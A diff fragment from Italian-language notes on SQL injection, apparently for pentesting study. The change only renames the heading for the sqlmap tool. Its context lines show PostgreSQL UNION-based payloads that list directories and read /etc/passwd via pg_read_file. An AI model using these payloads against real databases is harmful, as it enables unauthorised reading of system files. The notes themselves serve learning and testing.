@@ -91,7 +91,7 @@ union select null,pg_is_dir('/bin'),null from pg_stat_user_tables -- stampa i fi
 
 union select null,pg_read_file('etc/passwd'),null from pg_stat_user_tables -- legge il file
 ```
-## SQLmap
+## SQL Map
 SQLmap un tool per automatizzare il testing di sql injection con una serie di payload
 [SQL map](https://github.com/sqlmapproject/sqlmap)
 
